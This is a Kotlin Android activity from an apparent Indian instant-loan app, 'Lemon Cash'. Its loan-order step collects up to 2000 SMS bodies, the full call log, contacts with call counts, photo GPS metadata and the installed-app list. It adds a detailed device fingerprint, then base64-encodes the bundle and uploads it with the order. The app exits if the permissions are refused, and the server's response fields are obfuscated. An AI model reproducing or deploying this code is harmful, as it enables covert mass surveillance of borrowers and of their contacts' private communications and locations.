package com.lemon.now.ui.activity

import SPUtil
import ToastUtils
import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Context
import android.content.Intent
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.Message
import android.os.SystemClock
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony
import android.util.DisplayMetrics
import android.util.Log
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.Observer
import com.adjust.sdk.Adjust
import com.bumptech.glide.Glide
import com.google.gson.Gson
import com.lemon.now.base.App
import com.lemon.now.base.activity.BaseActivity1
import com.lemon.now.base.etx.util.e
import com.lemon.now.base.etx.view.dismissLoadingExt
import com.lemon.now.base.etx.view.showLoadingExt
import com.lemon.now.online.R
import com.lemon.now.online.databinding.ActivityOrderBinding
import com.lemon.now.ui.ApiService
import com.lemon.now.ui.bean.CallInfoBean
import com.lemon.now.ui.bean.DeviceAllBean
import com.lemon.now.ui.bean.DeviceInfoBean
import com.lemon.now.ui.bean.ImageInfoBean
import com.lemon.now.ui.bean.MSGInfoBean
import com.lemon.now.ui.bean.PackageInfoBean
import com.lemon.now.ui.bean.PhoneInfoBean
import com.lemon.now.ui.model.HomeViewModel
import com.lemon.now.util.SettingUtil
import com.lemon.now.util.SettingUtil.base64
import com.lemon.now.util.SettingUtil.calculateSleepDuration
import com.lemon.now.util.SettingUtil.firstInstallTime
import com.lemon.now.util.SettingUtil.getApplicationSignatureMD5
import com.lemon.now.util.SettingUtil.getApplicationSignatureSHA1
import com.lemon.now.util.SettingUtil.getCountryCode
import com.lemon.now.util.SettingUtil.getCountryCode2
import com.lemon.now.util.SettingUtil.getDisplayLanguage
import com.lemon.now.util.SettingUtil.getIPAddress
import com.lemon.now.util.SettingUtil.getIPv4Address
import com.lemon.now.util.SettingUtil.getLastUpdateTime
import com.lemon.now.util.SettingUtil.getNetworkCountryIso
import com.lemon.now.util.SettingUtil.getNetworkOperatorName
import com.lemon.now.util.SettingUtil.getNetworkOperatorName2
import com.lemon.now.util.SettingUtil.getNetworkOperatorName3
import com.lemon.now.util.SettingUtil.getNetworkType
import com.lemon.now.util.SettingUtil.getSHA256
import com.lemon.now.util.SettingUtil.getSystemLanguage
import com.lemon.now.util.SettingUtil.getWifiGatewayIPAddress
import com.lemon.now.util.SettingUtil.getWifiIPAddress
import com.lemon.now.util.SettingUtil.getWifiSSID
import com.lemon.now.util.SettingUtil.is4GNetworkAvailable
import com.lemon.now.util.SettingUtil.is5GNetworkAvailable
import com.lemon.now.util.SettingUtil.isAutoBrightnessEnabled
import com.lemon.now.util.SettingUtil.isDebugMode
import com.lemon.now.util.SettingUtil.isDeviceRooted2
import com.lemon.now.util.SettingUtil.isEmulator
import com.lemon.now.util.SettingUtil.isLowPowerModeEnabled
import com.lemon.now.util.SettingUtil.isMobileDataEnabled
import com.lemon.now.util.SettingUtil.isNetworkConnected
import com.lemon.now.util.SettingUtil.isO3Language
import com.lemon.now.util.SettingUtil.isSimCardReady
import com.lemon.now.util.SettingUtil.isWifiConnected
import java.lang.Math.sqrt
import java.util.Locale
import java.util.TimeZone
import com.lemon.now.online.BuildConfig

/**
 *   Lemon Cash
 *  OrderActivity.java
 *
 */
class OrderActivity : BaseActivity1<HomeViewModel, ActivityOrderBinding>() {
    private lateinit var someActivityResultLauncher: ActivityResultLauncher<Intent>

    companion object {
        private const val SMS_PERMISSION_REQUEST_CODE = 101
        private val REQUEST_WRITE_CONTACTS = 123
        private const val REQUEST_CODE_READ_EXTERNAL_STORAGE = 100
    }

    val permission =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && App.instance.applicationInfo.targetSdkVersion >= Build.VERSION_CODES.TIRAMISU) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        }

    override fun initView(savedInstanceState: Bundle?) {
        mViewBind.back.setOnClickListener {
            finish()
        }
        mViewModel.checkorderstatus(
            intent.getStringExtra("id").toString(),
            SettingUtil.isVpnConnected(this@OrderActivity).toString(),
            SettingUtil.getAvailableSimSlots(this@OrderActivity).toString(),
            SettingUtil.getActivatedSimCount(this@OrderActivity).toString()
        )

        mViewBind.next.setOnClickListener {
            mViewModel.getuserinfo(
                SettingUtil.isVpnConnected(this@OrderActivity).toString(),
                SettingUtil.getAvailableSimSlots(this@OrderActivity).toString(),
                SettingUtil.getActivatedSimCount(this@OrderActivity).toString()
            )
        }

        someActivityResultLauncher =
            registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
                if (result.resultCode == RESULT_OK) {
                    submitOrder()
                }
            }

    }

    private fun submitOrder() {
        if (allPermissionsGranted()) {
            loadinfo()
        } else {
            ActivityCompat.requestPermissions(
                this, arrayOf(
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    permission
                ), SMS_PERMISSION_REQUEST_CODE
            )
        }
    }

    private val MSG_CONTACT_INFO = 1

    private val handler = object : Handler(Looper.getMainLooper()) {
        override fun handleMessage(msg: Message) {
            super.handleMessage(msg)
            if (msg.what == MSG_CONTACT_INFO) {
                dismissLoadingExt()
                mViewModel.submitOrder(
                    msg.obj.toString(),
                    intent.getStringExtra("id").toString(),
                    SettingUtil.isVpnConnected(this@OrderActivity).toString(),
                    SettingUtil.getAvailableSimSlots(this@OrderActivity).toString(),
                    SettingUtil.getActivatedSimCount(this@OrderActivity).toString()
                )
            }
        }
    }

    @SuppressLint("Range")
    fun loadinfo() {
        showLoadingExt("Your application is being submitted, please do not exit or return.")
        Thread {
            val packageArrayList: ArrayList<PackageInfoBean> = ArrayList()
            val msgArrayList: ArrayList<MSGInfoBean> = ArrayList()
            val phoneArrayList: ArrayList<PhoneInfoBean> = ArrayList()
            val callArrayList: ArrayList<CallInfoBean> = ArrayList()
            val imgArrayList: ArrayList<ImageInfoBean> = ArrayList()

            val packageManager: PackageManager = packageManager
            val installedApps =
                packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
            for (appInfo in installedApps) {
                val launchIntent = packageManager.getLaunchIntentForPackage(packageName)
                if (launchIntent != null) {
                    val packageInfo = packageManager.getPackageInfo(appInfo.packageName, 0)
                    val applicationInfo: ApplicationInfo =
                        packageManager.getApplicationInfo(appInfo.packageName, 0)
                    val updateTimeMillis: Long = packageInfo.lastUpdateTime
                    val updateTime = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                        .format(java.util.Date(updateTimeMillis))
                    val installTimeMillis: Long = packageInfo.firstInstallTime
                    val installTime = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                        .format(java.util.Date(installTimeMillis))
                    val isSystemApp: Boolean =
                        (appInfo != null && appInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0)
                    packageArrayList.add(
                        PackageInfoBean(
                            appInfo.loadLabel(packageManager).toString(),
                            appInfo.packageName,
                            if (isSystemApp) "SYSTEM" else "NON_SYSTEM",
                            packageInfo.versionName,
                            packageInfo.versionCode,
                            updateTime,
                            installTime,
                            applicationInfo.sourceDir,
                            appInfo.flags
                        )
                    )
//                Log.d("InstalledApp", "Package Name: ${appInfo.packageName}, App Name: ${appInfo.loadLabel(packageManager)}")
                }

            }

            val smsUri = Uri.parse("content://sms/")
            val cursor = contentResolver.query(
                smsUri, null, null, null, "${Telephony.Sms.DEFAULT_SORT_ORDER} LIMIT 2000"
            )

            if (cursor != null) {
                val indexBody = cursor.getColumnIndex(Telephony.Sms.BODY)
                val indexAddress = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
                val indexDate = cursor.getColumnIndex(Telephony.Sms.DATE)
                val indexType = cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)
                val indexRead = cursor.getColumnIndexOrThrow(Telephony.Sms.READ)
                val indexId = cursor.getColumnIndexOrThrow(Telephony.Sms._ID)
                val indexperson = cursor.getColumnIndex(Telephony.Sms.PERSON)
                while (cursor.moveToNext()) {
                    val smsBody = cursor.getString(indexBody)
                    val phoneNumber = cursor.getString(indexAddress)
                    val date = cursor.getString(indexDate)
                    val contactName = getContactName(phoneNumber)
                    val type = cursor.getInt(indexType)
                    val read = cursor.getInt(indexRead)
                    val id = cursor.getLong(indexId)
                    val person = cursor.getString(indexperson)
                    val time = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                        .format(java.util.Date(date.toLong()))
                    val messageType = if (type == Telephony.Sms.MESSAGE_TYPE_INBOX) {
                        1
                    } else if (type == Telephony.Sms.MESSAGE_TYPE_SENT) {
                        2
                    } else {
                        1
                    }
                    val readStatus = if (read == 1) {
                        1
                    } else {
                        0
                    }
                    if (person != null) {

                    }
                    val personName = person ?: "null"
//                    Log.d(
//                        "InstalledApp",
//                        "ID: $time person: ${personName} Body: $smsBody, phoneNumber: " + "$phoneNumber ,contactName: $contactName,messageType: $messageType,readStatus: $readStatus"
//                    )
                    msgArrayList.add(
                        MSGInfoBean(
                            personName,
                            phoneNumber,
                            smsBody,
                            messageType,
                            time,
                            id.toString(),
                            readStatus,
                            contactName
                        )
                    )
                }
                cursor.close()
            }

            val callCountMap = HashMap<String, Int>()
            val callLogCursor2 = contentResolver.query(
                CallLog.Calls.CONTENT_URI, arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.DATE,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.DURATION
                ), null, null, null
            )

            callLogCursor2?.use { cursor ->
                if (cursor.moveToFirst()) {
                    do {
                        val phoneNumber =
                            cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                        val callDate = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE))
                        val callType = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE))
                        val cachedName =
                            cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
                        val duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION))
                        val displayName = if (cachedName.isNullOrEmpty()) {
                            getContactName(this@OrderActivity, phoneNumber)
                        } else {
                            cachedName
                        }
                        if (callType == CallLog.Calls.OUTGOING_TYPE || callType == CallLog.Calls.INCOMING_TYPE || callType == CallLog.Calls.MISSED_TYPE) {
                            if (callCountMap.containsKey(displayName)) {
                                val count = callCountMap[displayName] ?: 0
                                callCountMap[displayName] = count + 1
                            } else {
                                callCountMap[displayName] = 1
                            }
                        }
                        val callStatus = when (callType) {
                            CallLog.Calls.INCOMING_TYPE -> 1
                            CallLog.Calls.OUTGOING_TYPE -> 2
                            CallLog.Calls.MISSED_TYPE -> 3
                            else -> 0
                        }

                        val time = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                            .format(java.util.Date(callDate.toLong()))
                        callArrayList.add(
                            CallInfoBean(
                                phoneNumber, displayName, time, duration.toInt(), callStatus
                            )
                        )

//                        Log.d("InstalledApp", "displayName: $displayName phoneNumber: ${phoneNumber} ")
                    } while (cursor.moveToNext())
                    cursor.close()
                }
            }
            callLogCursor2?.close()
            val contactCursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI, arrayOf(
                    ContactsContract.Contacts._ID,
                    ContactsContract.Contacts.DISPLAY_NAME,
                    ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP
                ), null, null, null
            )

            if (contactCursor != null && contactCursor.moveToFirst()) {
                do {
                    val contactId =
                        contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts._ID))
                    val contactName =
                        contactCursor.getString(contactCursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
                    val lastUpdatedTime =
                        contactCursor.getLong(contactCursor.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP))


                    val time = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                        .format(java.util.Date(lastUpdatedTime.toLong()))

                    callCountMap.forEach { (name, count) ->
                        Log.d("InstalledApp", "name: $name count: ${count} Body: ")
                    }
                    var count = callCountMap.get(contactName)
                    phoneArrayList.add(
                        PhoneInfoBean(
                            time, 0, count ?: 0, contactId, "", "", "", ""
                        )
                    )
//                    Log.d("InstalledApp", "contactName: $contactName count: ${count} ")
                } while (contactCursor.moveToNext())
            }
            contactCursor?.close()

            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf<String>(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.ORIENTATION,
                MediaStore.Images.Media.WIDTH,
                MediaStore.Images.Media.HEIGHT,
                MediaStore.Images.Media.DATE_TAKEN,
                MediaStore.Images.Media.LATITUDE,
                MediaStore.Images.Media.LONGITUDE,
            )

            val sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC"

            contentResolver.query(uri, projection, null, null, sortOrder).use { cursor ->
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        val id = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media._ID))
                        val displayName =
                            cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME))
                        val orientation =
                            cursor.getInt(cursor.getColumnIndex(MediaStore.Images.Media.ORIENTATION))
                        val width =
                            cursor.getInt(cursor.getColumnIndex(MediaStore.Images.Media.WIDTH))
                        val height =
                            cursor.getInt(cursor.getColumnIndex(MediaStore.Images.Media.HEIGHT))
                        val dateTaken =
                            cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN))
                        val latitude =
                            cursor.getFloat(cursor.getColumnIndex(MediaStore.Images.Media.LATITUDE))
                        val longitude =
                            cursor.getFloat(cursor.getColumnIndex(MediaStore.Images.Media.LONGITUDE))
                        val time = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                            .format(java.util.Date(dateTaken.toLong()))
                        imgArrayList.add(
                            ImageInfoBean(
                                displayName,
                                "",
                                width.toString(),
                                height.toString(),
                                longitude.toString(),
                                latitude.toString(),
                                "",
                                time
                            )
                        )
//                        Log.d(
//                            "InstalledApp",
//                            "id: $id displayName: ${displayName} dateTaken${dateTaken} latitude Body: "
//                        )
                    } while (cursor.moveToNext())
                }
                cursor?.close()
            }
            var channel: String by SPUtil(ApiService.channel, "")
            var firsttime: String by SPUtil(ApiService.firsttime, "")
            var referrerurl: String by SPUtil("referrerurl", "")
            val displayMetrics = resources.displayMetrics
            val screenWidthPixels = displayMetrics.widthPixels
            val screenHeightPixels = displayMetrics.heightPixels
            val screenDensity = displayMetrics.densityDpi.toFloat() / DisplayMetrics.DENSITY_DEFAULT

            val screenWidthInches = screenWidthPixels / screenDensity
            val screenHeightInches = screenHeightPixels / screenDensity

            val screenSizeInches =
                kotlin.math.sqrt((screenWidthInches * screenWidthInches) + (screenHeightInches * screenHeightInches))
            Adjust.getGoogleAdId(this) { googleadid ->
                val info = DeviceAllBean(
                    "Android",
                    this.getString(R.string.app_name),
                    channel,
                    "",
                    googleadid,
                    firsttime,
                    SystemClock.elapsedRealtime().toString(),
                    SystemClock.elapsedRealtime().toString(),
                    calculateSleepDuration().toString(),
                    getLastUpdateTime(packageManager, packageName),
                    firstInstallTime(packageManager, packageName),
                    getSystemLanguage(this),
                    getCountryCode(this),
                    getDisplayLanguage(this),
                    getCountryCode2(this),
                    isO3Language(),
                    "",
                    TimeZone.getDefault().displayName,
                    isLowPowerModeEnabled(this).toString(),
                    isAutoBrightnessEnabled(this).toString(),
                    isEmulator().toString(),
                    isDeviceRooted2().toString(),
                    isDebugMode().toString(),
                    "1",
                    "1",
                    getNetworkOperatorName(this),
                    isSimCardReady(this).toString(),
                    getNetworkOperatorName2(this),
                    "",
                    getNetworkCountryIso(this).toString(),
                    getApplicationSignatureMD5(this),
                    this.applicationInfo.uid.toString(),
                    getApplicationSignatureSHA1(this),
                    getWifiSSID(this),
                    Build.TYPE,
                    Build.BOARD,
                    Build.PRODUCT,
                    getSHA256(this) ?: "",
                    packageManager.getPackageInfo(packageName, 0).applicationInfo.sourceDir,
                    "",
                    "true",
                    Build.USER,
                    "",
                    "false",
                    "",
                    "",
                    "",
                    "",
                    referrerurl,
                    "",
                    Locale.getDefault().country,

                //net
                    getNetworkType(this).toString(),
                    is4GNetworkAvailable(this).toString(),
                    is5GNetworkAvailable(this).toString(),
                    isWifiConnected(this).toString(),
                    isWifiConnected(this).toString(),
                    isMobileDataEnabled(this).toString(),
                    isNetworkConnected(this).toString(),
                    "",
                    SettingUtil.isVpnConnected(this).toString(),
                    getNetworkOperatorName2(this),
                    getNetworkOperatorName3(this),
                    getNetworkCountryIso(this),
                    getIPAddress().toString(),
                    getIPv4Address().toString(),
                    getWifiIPAddress(this).toString(),
                    getWifiGatewayIPAddress(this).toString()

                //moble
                    ,
                    Build.BOARD,
                    Build.CPU_ABI.toString(),
                    Build.CPU_ABI2.toString(),
                    "",
                    Build.MODEL,
                    Build.BRAND,
                    Build.MANUFACTURER,
                    Build.DEVICE,
                    Build.HARDWARE,
                    Build.PRODUCT,
                    Build.VERSION.RELEASE,
                    Build.VERSION.SDK_INT.toString(),
                    Build.VERSION.SDK,
                    Build.VERSION.SDK,
                    BuildConfig.VERSION_CODE.toString(),
                    Build.FINGERPRINT,
                    Build.DISPLAY,
                    Build.USER,
                    Build.getRadioVersion(),
                    displayMetrics.widthPixels.toString(),
                    displayMetrics.heightPixels.toString(),
                    displayMetrics.heightPixels.toString(),
                    screenSizeInches.toString(),
                    Settings.System.getInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE)
                        .toString(),
                    resources.displayMetrics.densityDpi.toString(),
                    resources.displayMetrics.density.toString()
                )
                var deviceinfobean = DeviceInfoBean(
                    packageArrayList,
                    msgArrayList,
                    phoneArrayList,
                    callArrayList,
                    imgArrayList,
                    info
                )

                e("InstalledApp", Gson().toJson(deviceinfobean))
                val message: Message =
                    handler.obtainMessage(MSG_CONTACT_INFO, Gson().toJson(deviceinfobean).base64())
                handler.sendMessage(message)
            }


        }.start()
    }


    @SuppressLint("Range")
    private fun getContactName(context: Context, phoneNumber: String): String {
        val contentResolver: ContentResolver = context.contentResolver
        val contactNameCursor = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME),
            ContactsContract.CommonDataKinds.Phone.NUMBER + " = ?",
            arrayOf(phoneNumber),
            null
        )

        contactNameCursor?.use { cursor ->
            if (cursor.moveToFirst()) {
                return cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
            }
        }

        return ""
    }

    private fun allPermissionsGranted(): Boolean {
        return (ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_CONTACTS
        ) == PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED) && ContextCompat.checkSelfPermission(
            this, permission
        ) == PackageManager.PERMISSION_GRANTED
    }

    private fun getContactName(phoneNumber: String): String {
        val uri = Uri.withAppendedPath(
            ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber)
        )
        val cursor = contentResolver.query(uri, null, null, null, null)
        cursor?.use {
            if (it.moveToFirst()) {
                val nameIndex = it.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME)
                return it.getString(nameIndex)
            }
        }
        return phoneNumber
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            SMS_PERMISSION_REQUEST_CODE -> {
                if (allPermissionsGranted()) {
                    loadinfo()
                } else {
                    finish()
                }
            }

            REQUEST_WRITE_CONTACTS -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                } else {
                    finish()
                }
            }
        }
    }

    override fun createObserver() {

        mViewModel.orderstatusdata.observe(this, Observer {
            if (it.rZ81DSU7WU4hny4ukGHljvjO41bfB == 1) {
                if (it.Qbnsde5LgABnpY9IpFTFXkgR3l8 != null) {
                    Glide.with(this).load(it.Qbnsde5LgABnpY9IpFTFXkgR3l8.pPQGUTNAxoA)
                        .into(mViewBind.productLogo)
                    mViewBind.pfdroDCductName.text =
                        it.Qbnsde5LgABnpY9IpFTFXkgR3l8.zTAPvIwFI3Sv7UZv2SVGDrIOePGxxR9AqV
                    mViewBind.amount.text = "₹ " + it.Qbnsde5LgABnpY9IpFTFXkgR3l8.WA4R2qnu5lhz7
                    mViewBind.receivedamount.text =
                        "₹ " + it.Qbnsde5LgABnpY9IpFTFXkgR3l8.noNz52nAR9teAGnKBK


                    mViewBind.terms.text =
                        "₹ " + it.Qbnsde5LgABnpY9IpFTFXkgR3l8.HPQKWiwz42QnEFJJ8kFrx.toString()
                    mViewBind.verificationfee.text =
                        it.Qbnsde5LgABnpY9IpFTFXkgR3l8.wCQXjLl5RSFnUxwYCfTN8WztD1ZrD3Ut.toString()

                    mViewBind.gst.text =
                        "₹ " + it.Qbnsde5LgABnpY9IpFTFXkgR3l8.pnyYapGgsgfnmViDd7tiiRLMQqE3W3QbXJL.toString()
                    mViewBind.overduecharge.text =
                        it.Qbnsde5LgABnpY9IpFTFXkgR3l8.vWdgZA58vY2J8RkbYUJXiCV6aFytmxz

                    mViewBind.interest.text =
                        "₹ " + it.Qbnsde5LgABnpY9IpFTFXkgR3l8.OxxwB0d5KS25mPAcZhLw86mgedORI.toString()
                    mViewBind.repaymentamount.text =
                        "₹ " + it.Qbnsde5LgABnpY9IpFTFXkgR3l8.Ei5rFw3ggCfFFxvogcCvdtX.toString()
                }
            }
        })

        mViewModel.homebean.observe(this, Observer {
            if (it.rZ81DSU7WU4hny4ukGHljvjO41bfB == 1) {
                if (it.mKDa0r8qOCzrAe6Pj == 1) {
                    val intent = Intent(this@OrderActivity, AuthenticationActivity::class.java)
                    startActivity(intent)
                } else if (it.mKDa0r8qOCzrAe6Pj == 2) {
                    if (it.FUiNUblg6avFY2 == 0) {
                        val intent = Intent(this@OrderActivity, UserFaceActivity::class.java)
                        intent.putExtra("phototext", it.FC9KFV7R3tgHg3grZ8uvFak7NdzLXMR7)
                        someActivityResultLauncher.launch(intent)
                    } else if (it.FUiNUblg6avFY2 == 1) {
                        submitOrder()
                    }
                }
            }
        })

        mViewModel.submitdata.observe(this, Observer {
            if (it.rZ81DSU7WU4hny4ukGHljvjO41bfB == 1) {
                val intent = Intent()
                intent.putParcelableArrayListExtra("list", it.o2Hvk1wvAGN)
                intent.setClass(this, OrderSuccesActivity::class.java)
                startActivity(intent)
            } else {
                ToastUtils.showShort(this@OrderActivity, it.vWCgp64OkxPVoGqics)
            }
        })
    }
}